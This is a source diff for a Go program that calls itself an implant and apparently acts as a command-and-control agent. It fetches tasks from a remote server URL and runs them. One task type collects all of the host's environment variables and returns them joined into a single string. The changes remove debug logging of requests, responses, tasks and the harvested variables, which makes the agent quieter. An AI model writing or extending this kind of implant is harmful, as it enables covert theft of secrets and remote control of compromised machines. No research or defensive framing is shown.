@@ -62,15 +62,12 @@ func (i *thisImplant) GetTasks() error {
 	if err != nil {
 		return err
 	}
-	log.Println(reqURL)
-	log.Println(string(body))
+	defer resp.Body.Close()
 	err = json.Unmarshal(body, &t)
 	if err != nil {
 		return err
 	}
-	log.Println(t)
 	*i.Tasks = append(*i.Tasks, t...)
-	defer resp.Body.Close()
 	return nil
 }
 
@@ -132,10 +129,9 @@ func (i *thisImplant) runTask(t models.Task) (models.Result, error) {
 		r.TaskId = t.Id
 		contents := unix.Environ()
 		if contents == nil {
-			r.Contents = "Could not"
+			r.Contents = "Could not load the environment variables"
 		}
 		r.Contents = strings.Join(contents, "|")
-		log.Println(r.Contents)
 		return r, nil
 	default:
 		return models.Result{}, errors.New("No such task type found. " + t.Type)
@@ -230,13 +226,10 @@ func main() {
 	if err != nil {
 		log.Println(err)
 	}
-	log.Println(implant)
 	err = implant.GetTasks()
 	if err != nil {
 		log.Println(err)
 	}
-	// log.Println(implant)
-	log.Println(implant.Tasks)
 	err = implant.ServiceTasks()
 	if err != nil {
 		log.Println(err)
